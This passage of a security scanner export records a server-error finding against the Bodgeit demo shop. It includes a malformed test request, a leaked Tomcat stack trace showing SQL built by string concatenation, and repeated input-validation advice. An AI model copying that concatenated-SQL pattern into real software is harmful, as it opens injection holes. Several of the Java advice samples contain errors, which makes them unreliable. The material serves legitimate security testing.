org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","The application has responded with an error message, indicating an undefined state that may expose sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text> <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text> <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text> <text>[4] Verify that the data belongs to the set offered to the client.</text> <text>[5] Do not output debugging error messages and exceptions in a production environment.</text> </fixRecommendation> <fixRecommendation type=""ASP.NET""> <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text> <text><compilation </text> <indentText> debug=""false""</indentText> <text>/></text> <br></br> <text>For more information, see ""HOW TO: Disable Debugging for ASP.NET Applications"" in: </text> <link target=""http://support.microsoft.com/default.aspx?scid=kb;en-us;815157"">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link> <br></br> <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text> <br></br> <text>To make sure that all the required parameters exist in a request, use the ""RequiredFieldValidator"" validation control. This control ensures that the user does not skip an entry in the web form.</text> <br></br> <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text> <br></br> <text>[1] ""RangeValidator"": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text> <br></br> <text>[2] ""RegularExpressionValidator"": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text> <br></br> <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text> <br></br> <text>There are two ways to check for user input validity: </text> <br></br> <text>1. Test for a general error state: </text> <br></br> <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text> <br></br> <text>2. Test for the error state of individual controls:</text> <br></br> <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text> </fixRecommendation> <fixRecommendation type=""J2EE""> <text>** Input Data Validation:</text> <br></br> <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets. Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text> <br></br> <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text> <text>[1] Required field</text> <text>[2] Field data type (all HTTP request parameters are Strings by default)</text> <text>[3] Field length</text> <text>[4] Field range</text> <text>[5] Field options</text> <text>[6] Field pattern</text> <text>[7] Cookie values</text> <text>[8] HTTP Response</text> <br></br> <text>A good practice is to implement the above routine as static methods in a ""Validator"" utility class. The following sections describe an example validator class.</text> <br></br> <text>[1] Required field</text> <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces. </text> <br></br> <text>Example of how to validate required fields:</text> <br></br> <code> // Java example to validate required fields public Class Validator { ... public static boolean validateRequired(String value) { boolean isFieldValid = false; if (value != null && value.trim().length() > 0) { isFieldValid = true; } return isFieldValid; } ... } ... String fieldValue = request.getParameter(""fieldName""); if (Validator.validateRequired(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>[2] Field data type</text> <text>In web applications, input parameters are poorly typed. For example, all HTTP request parameters or cookie values are of type String. The developer is responsible for verifying the input is of the correct data type. Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text> <br></br> <text>Example of how to validate a numeric field (type int):</text> <br></br> <code> // Java example to validate that a field is an int number public Class Validator { ... public static boolean validateInt(String value) { boolean isFieldValid = false; try { Integer.parseInt(value); isFieldValid = true; } catch (Exception e) { isFieldValid = false; } return isFieldValid; } ... } ... // check if the HTTP request parameter is of type int String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>A good practice is to convert all HTTP request parameters to their respective data types. For example, store the ""integerValue"" of a request parameter in a request attribute and use it as shown in the following example:</text> <br></br> <code> // Example to convert the HTTP request parameter to a primitive wrapper data type // and store this value in a request attribute for further processing String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // convert fieldValue to an Integer Integer integerValue = Integer.getInteger(fieldValue); // store integerValue in a request attribute request.setAttribute(""fieldName"", integerValue); } ... // Use the request attribute for further processing Integer integerValue = (Integer)request.getAttribute(""fieldName""); ... </code> <br></br> <text>The primary Java data types that the application should handle:</text> <text>- Byte</text> <text>- Short</text> <text>- Integer</text> <text>- Long</text> <text>- Float</text> <text>- Double</text> <text>- Date</text> <br></br> <text>[3] Field length</text> <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text> <br></br> <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text> <br></br> <code> // Example to validate the field length public Class Validator { ... public static boolean validateLength(String value, int minLength, int maxLength) { String validatedValue = value; if (!validateRequired(value)) { validatedValue = """"; } return (validatedValue.length() >= minLength && validatedValue.length() <= maxLength); } ... } ... String userName = request.getParameter(""userName""); if (Validator.validateRequired(userName)) { if (Validator.validateLength(userName, 8, 20)) { // userName is valid, continue further processing ... } } </code> <br></br> <text>[4] Field range</text> <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text> <br></br> <text>Example to validate that the input numberOfChoices is between 10 and 20:</text> <br></br> <code> // Example to validate the field range public Class Validator { ... public static boolean validateRange(int value, int min, int max) { return (value >= min && value <= max); } ... } ... String fieldValue = request.getParameter(""numberOfChoices""); if (Validator.validateRequired(fieldValue)) { if (Validator.validateInt(fieldValue)) { int numberOfChoices = Integer.parseInt(fieldValue); if (Validator.validateRange(numberOfChoices, 10, 20)) { // numberOfChoices is valid, continue processing request ... } } } </code> <br></br> <text>[5] Field options</text> <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options. Remember that a malicious user can easily modify any option value. Always validate the selected user value against the allowed options as defined by the functional requirements.</text> <br></br> <text>Example to validate the user selection against a list of allowed options:</text> <br></br> <code> // Example to validate user selection against a list of options public Class Validator { ... public static boolean validateOption(Object[] options, Object value) { boolean isValidValue = false; try { List list = Arrays.asList(options); if (list != null) { isValidValue = list.contains(value); } } catch (Exception e) { } return isValidValue; } ... } ... // Allowed options String[] options = {""option1"", ""option2"", ""option3""); // Verify that the user selection is one of the allowed options String userSelection = request.getParameter(""userSelection""); if (Validator.validateOption(options, userSelection)) { // valid user selection, continue processing request ... } </code> <br></br> <text>[6] Field pattern</text> <text>Always check that the user input matches a pattern as defined by the functionality requirements. For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text> <text>^[a-zA-Z0-9]*$</text> <br></br> <text>Java 1.3 or earlier versions do not include any regular expression packages. Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support. </text> <text>Example to perform regular expression validation:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Apache regular expression package import org.apache.regexp.RE; import org.apache.regexp.RESyntaxException; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { RE r = new RE(expression); match = r.match(value); } return match; } ... } ... // Verify that the userName request parameter is alpha-numeric String userName = request.getParameter(""userName""); if (Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { // userName is valid, continue processing request ... } </code> <br></br> <text>Java 1.4 introduced a new regular expression package (java.util.regex). Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Java 1.4 regular expression package import java.util.regex.Pattern; import java.util.regexe.Matcher; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { match = Pattern.matches(expression, value); } return match; } ... } </code> <br></br> <text>[7] Cookie value</text> <text>Use the javax.servlet.http.Cookie object to validate the cookie value. The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text> <br></br> <text>Example to validate a required cookie value:</text> <br></br> <code> // Example to validate a required cookie value // First retrieve all available cookies submitted in the HTTP request Cookie[] cookies = request.getCookies(); if (cookies != null) { // find the ""user"" cookie for (int i=0; i<cookies.length; ++i) { if (cookies[i].getName().equals(""user"")) { // validate the cookie value if (Validator.validateRequired(cookies[i].getValue()) { // valid cookie value, continue processing request ... } } } } </code> <br></br> <text>[8] HTTP Response</text> <text>[8-1] Filter user input</text> <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities. These are the HTML sensitive characters:</text> <text>< > "" ' % ; ) ( & +</text> <br></br> <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text> <br></br> <code> // Example to filter sensitive data to prevent cross-site scripting public Class Validator { ... public static String filter(String value) { if (value == null) { return null; } StringBuffer result = new StringBuffer(value.length()); for (int i=0; i<value.length(); ++i) { switch (value.charAt(i)) { case '<': result.append(""&lt;""); break; case '>': result.append(""&gt;""); break; case '""': result.append(""&quot;""); break; case '\'': result.append(""&#39;""); break; case '%': result.append(""&#37;""); break; case ';': result.append(""&#59;""); break; case '(': result.append(""&#40;""); break; case ')': result.append(""&#41;""); break; case '&': result.append(""&amp;""); break; case '+': result.append(""&#43;""); break; default: result.append(value.charAt(i)); break; } return result; } ... } ... // Filter the HTTP response using Validator.filter PrintWriter out = response.getWriter(); // set output response out.write(Validator.filter(response)); out.close(); </code> <br></br> <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text> <br></br> <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text> <br></br> <code> // Example to filter all sensitive characters in the HTTP response using a Java Filter. // This example is for illustration purposes since it will filter all content in the response, including HTML tags! public class SensitiveCharsFilter implements Filter { ... public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { PrintWriter out = response.getWriter(); ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response); chain.doFilter(request, wrapper); CharArrayWriter caw = new CharArrayWriter(); caw.write(Validator.filter(wrapper.toString())); response.setContentType(""text/html""); response.setContentLength(caw.toString().length()); out.write(caw.toString()); out.close(); } ... public class CharResponseWrapper extends HttpServletResponseWrapper { private CharArrayWriter output; public String toString() { return output.toString(); } public CharResponseWrapper(HttpServletResponse response){ super(response); output = new CharArrayWriter(); } public PrintWriter getWriter(){ return new PrintWriter(output); } } } } </code> <br></br> <text>[8-2] Secure the cookie</text> <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie using a secure protocol, such as HTTPS or SSL.</text> <br></br> <text>Example to secure the ""user"" cookie:</text> <br></br> <code> // Example to secure a cookie, i.e. instruct the browser to // send the cookie using a secure protocol Cookie cookie = new Cookie(""user"", ""sensitive""); cookie.setSecure(true); response.addCookie(cookie); </code> <br></br> <text>RECOMMENDED JAVA TOOLS</text> <text>The two main Java frameworks for server-side validation are:</text> <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text> <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text> <br></br> <text>Struts defines the following basic input validators, but custom validators may also be defined:</text> <text>required: succeeds if the field contains any characters other than white space.</text> <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text> <text>range: succeeds if the value is within the values given by the min and max attributes ((value >= min) & (value <= max)).</text> <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text> <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text> <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text> <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text> <text>creditCard: succeeds if the value could be a valid credit card number.</text> <text>e-mail: succeeds if the value could be a valid e-mail address.</text> <br></br> <text>Example to validate the userName field of a loginForm using Struts Validator:</text> <code> <form-validation> <global> ... <validator name=""required"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateRequired"" msg=""errors.required""> </validator> <validator name=""mask"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateMask"" msg=""errors.invalid""> </validator> ... </global> <formset> <form name=""loginForm""> <!-- userName is required and is alpha-numeric case insensitive --> <field property=""userName"" depends=""required,mask""> <!-- message resource key to display if validation fails --> <msg name=""mask"" key=""login.userName.maskmsg""/> <arg0 key=""login.userName.displayname""/> <var> <var-name>mask</var-name> <var-value>^[a-zA-Z0-9]*$</var-value> </var> </field> ... </form> ... </formset> </form-validation> </code> <br></br> <text>[2] JavaServer Faces Technology</text> <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text> <br></br> <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text> <text>validate_doublerange: registers a DoubleRangeValidator on a component</text> <text>validate_length: registers a LengthValidator on a component</text> <text>validate_longrange: registers a LongRangeValidator on a component</text> <text>validate_required: registers a RequiredValidator on a component</text> <text>validate_stringrange: registers a StringRangeValidator on a component</text> <text>validator: registers a custom Validator on a component</text> <br></br> <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text> <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text> <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text> <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text> <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text> <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>input_text: accepts a text string of one line.</text> <text>output_text: displays a text string of one line.</text> <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>input_hidden: allows a page author to include a hidden variable in a page</text> <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text> <text>input_textarea: accepts multiple lines of text</text> <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text> <text>output_label: displays a nested component as a label for a specified input field</text> <text>output_message: displays a localized message</text> <br></br> <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text> <code> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> ... <jsp:useBean id=""UserBean"" class=""myApplication.UserBean"" scope=""session"" /> <f:use_faces> <h:form formName=""loginForm"" > <h:input_text id=""userName"" size=""20"" modelReference=""UserBean.userName""> <f:validate_required/> <f:validate_length minimum=""8"" maximum=""20""/> </h:input_text> <!-- display errors if present --> <h:output_errors id=""loginErrors"" clientId=""userName""/> <h:command_button id=""submit"" label=""Submit"" commandName=""submit"" /><p> </h:form> </f:use_faces> </code> <br></br> <br></br> <text>REFERENCES</text> <text>Java API 1.3 - </text> <link target=""http://java.sun.com/j2se/1.3/docs/api/"">http://java.sun.com/j2se/1.3/docs/api/</link> <text>Java API 1.4 - </text> <link target=""http://java.sun.com/j2se/1.4/docs/api/"">http://java.sun.com/j2se/1.4/docs/api/</link> <text>Java Servlet API 2.3 - </text> <link target=""http://java.sun.com/products/servlet/2.3/javadoc/"">http://java.sun.com/products/servlet/2.3/javadoc/</link> <text>Java Regular Expression Package - </text> <link target=""http://jakarta.apache.org/regexp/"">http://jakarta.apache.org/regexp/</link> <text>Jakarta Validator - </text> <link target=""http://jakarta.apache.org/commons/validator/"">http://jakarta.apache.org/commons/validator/</link> <text>JavaServer Faces Technology - </text> <link target=""http://java.sun.com/j2ee/javaserverfaces/"">http://java.sun.com/j2ee/javaserverfaces/</link> <br></br> <text>** Error Handling:</text> <br></br> <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern. In this pattern a Servlet acts as a Controller. A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model). The Servlet then forwards the request to a JSP (View) to render the processing results. Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text> <br></br> <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces. A good error handling strategy addresses the following items:</text> <br></br> <text>[1] Defining Errors</text> <text>[2] Reporting Errors</text> <text>[3] Rendering Errors</text> <text>[4] Error Mapping</text> <br></br> <text>[1] Defining Errors</text> <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided. Instead, the application should use error keys that map to known application failures. A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties. For example, if the ""user_name"" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text> <br></br> <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the ""user_name"" field is required;</text> <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the ""user_name"" field should be alphanumeric;</text> <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the ""user_name"" value is a duplicate in the database;</text> <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the ""user_name"" value is invalid;</text> <br></br> <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text> <br></br> <text>- ErrorKeys: defines all error keys</text> <br></br> <code> // Example: ErrorKeys defining the following error keys: // - ERROR_USERNAME_REQUIRED // - ERROR_USERNAME_ALPHANUMERIC // - ERROR_USERNAME_DUPLICATE // - ERROR_USERNAME_INVALID // ... public Class ErrorKeys { public static final String ERROR_USERNAME_REQUIRED = ""error.username.required""; public static final String ERROR_USERNAME_ALPHANUMERIC = ""error.username.alphanumeric""; public static final String ERROR_USERNAME_DUPLICATE = ""error.username.duplicate""; public static final String ERROR_USERNAME_INVALID = ""error.username.invalid""; ... } </code> <indentText> </indentText> <text>- Error: encapsulates an individual error</text> <br></br> <code> // Example: Error encapsulates an error key. // Error is serializable to support code executing in multiple JVMs. public Class Error implements Serializable { // Constructor given a specified error key public Error(String key) { this(key, null); } // Constructor given a specified error key and array of placeholder objects public Error(String key, Object[] values) { this.key = key; this.values = values; } // Returns the error key public String getKey() { return this.key; } // Returns the placeholder values public Object[] getValues() { return this.values; } private String key = null; private Object[] values = null; } </code> <br></br> <text>- Errors: encapsulates a Collection of errors</text> <br></br> <code> // Example: Errors encapsulates the Error objects being reported to the presentation layer. // Errors are stored in a HashMap where the key is the bean property name and value is an // ArrayList of Error objects. public Class Errors implements Serializable { // Adds an Error object to the Collection of errors for the specified bean property. public void addError(String property, Error error) { ArrayList propertyErrors = (ArrayList)errors.get(property); if (propertyErrors == null) { propertyErrors = new ArrayList(); errors.put(property, propertyErrors); } propertyErrors.put(error); } // Returns true if there are any errors public boolean hasErrors() { return (errors.size > 0); } // Returns the Errors for the specified property public ArrayList getErrors(String property) { return (ArrayList)errors.get(property); } private HashMap errors = new HashMap(); } </code> <br></br> <text>Using the above framework classes, here is an example to process validation errors of the ""user_name"" field:</text> <br></br> <code> // Example to process validation errors of the ""user_name"" field. Errors errors = new Errors(); String userName = request.getParameter(""user_name""); // (a) Required validation rule if (!Validator.validateRequired(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED)); } // (b) Alpha-numeric validation rule else if (!Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC)); } else { // (c) Duplicate check validation rule // We assume that there is an existing UserValidationEJB session bean that implements // a checkIfDuplicate() method to verify if the user already exists in the database. try { ... if (UserValidationEJB.checkIfDuplicate(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE)); } } catch (RemoteException e) { // log the error logger.error(""Could not validate user for specified userName: "" + userName); errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE); } } // set the errors object in a request attribute called ""errors"" request.setAttribute(""errors"", errors); ... </code> <br></br> <text>[2] Reporting Errors</text> <text>There are two ways to report web-tier application errors:</text> <text>(a) Servlet Error Mechanism</text> <text>(b) JSP Error Mechanism</text> <br></br> <text>[2-a] Servlet Error Mechanism</text> <text>A Servlet may report errors by:</text> <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text> <text>- calling response.sendError with an HTTP error code argument, OR</text> <text>- throwing an exception</text> <br></br> <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data. The following example illustrates how to forward to an input JSP (userInput.jsp):</text> <br></br> <code> // Example to forward to the userInput.jsp following user validation errors RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd != null) { rd.forward(request, response); } </code> <br></br> <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument. Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes. </text> <br></br> <text>Example to return a HTTP error:</text> <code> // Example to return a HTTP error code RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd == null) { // messages is a resource bundle with all message keys and values response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID)); } </code> <br></br> <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text> <text>- RuntimeException</text> <text>- ServletException</text> <text>- IOException</text> <br></br> <text>[2-b] JSP Error Mechanism</text> <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text> <br></br> <code> <%@ page errorPage=""/errors/userValidation.jsp"" %> </code> <br></br> <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request p...""\\n""...data exceeds space allotted for cell.","","",""
"DemoApps","","Bodgeit","87","Application Error","","Info","Open","2015-10-15","IBM Security AppScan Standard","550","Information Exposure Through Server Error Message","","/bodgeit/basket.jsp","quantity_11","","http://localhost/bodgeit/basket.jsp","Parameter: quantity_11=1 -> quantity_11=)","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31; b_id=3 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/basket.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 34 quantity_11=)&update=Update+Basket HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 3029 Date: Thu, 15 Oct 2015 22:23:41 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - An exception occurred processing JSP page /basket.jsp at line 244</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>An exception occurred processing JSP page /basket.jsp at line 244</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: An exception occurred processing JSP page /basket.jsp at line 244 241: stmt.execute(); 242: stmt.close(); 243: } else { 244: stmt = conn.prepareStatement(&quot;UPDATE BasketContents SET quantity = &quot; + Integer.parseInt(value) + &quot; WHERE basketid=&quot; + basketId + 245: &quot; AND productid = &quot; + prodId); 246: stmt.execute(); 247: if (Integer.parseInt(value) &lt; 0) { Stacktrace: org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:575) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;)&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:569) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","The application has responded with an error message, indicating an undefined state that may expose sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text> <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text> <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text> <text>[4] Verify that the data belongs to the set offered to the client.</text> <text>[5] Do not output debugging error messages and exceptions in a production environment.</text> </fixRecommendation> <fixRecommendation type=""ASP.NET""> <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text> <text><compilation </text> <indentText> debug=""false""</indentText> <text>/></text> <br></br> <text>For more information, see ""HOW TO: Disable Debugging for ASP.NET Applications"" in: </text> <link target=""http://support.microsoft.com/default.aspx?scid=kb;en-us;815157"">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link> <br></br> <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text> <br></br> <text>To make sure that all the required parameters exist in a request, use the ""RequiredFieldValidator"" validation control. This control ensures that the user does not skip an entry in the web form.</text> <br></br> <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text> <br></br> <text>[1] ""RangeValidator"": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text> <br></br> <text>[2] ""RegularExpressionValidator"": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text> <br></br> <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text> <br></br> <text>There are two ways to check for user input validity: </text> <br></br> <text>1. Test for a general error state: </text> <br></br> <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text> <br></br> <text>2. Test for the error state of individual controls:</text> <br></br> <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text> </fixRecommendation> <fixRecommendation type=""J2EE""> <text>** Input Data Validation:</text> <br></br> <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets. Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text> <br></br> <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text> <text>[1] Required field</text> <text>[2] Field data type (all HTTP request parameters are Strings by default)</text> <text>[3] Field length</text> <text>[4] Field range</text> <text>[5] Field options</text> <text>[6] Field pattern</text> <text>[7] Cookie values</text> <text>[8] HTTP Response</text> 